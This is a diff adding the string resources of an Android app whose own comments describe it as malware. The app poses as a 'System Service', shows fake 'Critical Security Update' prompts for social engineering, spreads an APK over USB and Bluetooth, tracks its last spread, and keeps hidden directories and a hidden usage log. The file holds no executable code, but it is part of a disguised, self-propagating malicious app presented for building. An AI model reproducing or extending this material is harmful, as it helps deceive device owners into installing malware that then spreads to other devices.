@@ -1,1 +1,39 @@
-
+<!-- res/values/strings.xml -->
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <!-- Hidden app name - appears as system component -->
+    <string name="app_name">System Service</string>
+    
+    <!-- Notification strings -->
+    <string name="notification_title">System Service</string>
+    <string name="notification_text">Android system processes running</string>
+    <string name="notification_channel_name">System Service Channel</string>
+    
+    <!-- Service descriptions -->
+    <string name="service_description">Critical system background operations</string>
+    
+    <!-- Deceptive strings for social engineering -->
+    <string name="update_title">Critical Security Update</string>
+    <string name="update_message">Your device requires an important security update. Install now to protect your data.</string>
+    <string name="update_button">Install Update</string>
+    
+    <!-- USB deployment strings -->
+    <string name="usb_title">System Update Required</string>
+    <string name="usb_message">This device requires a critical security update.</string>
+    <string name="usb_filename">SystemUpdate.apk</string>
+    
+    <!-- Bluetooth strings -->
+    <string name="bluetooth_name">Android System</string>
+    <string name="bluetooth_file">system_update.apk</string>
+    
+    <!-- Shared preferences keys -->
+    <string name="pref_first_run">first_run_completed</string>
+    <string name="pref_activation_time">activation_timestamp</string>
+    <string name="pref_last_spread">last_spread_timestamp</string>
+    <string name="pref_device_id">device_identifier</string>
+    
+    <!-- Hidden file/path names -->
+    <string name="hidden_dir">.system</string>
+    <string name="cache_dir">.cache</string>
+    <string name="log_file">.usage_stats.log</string>
+</resources>
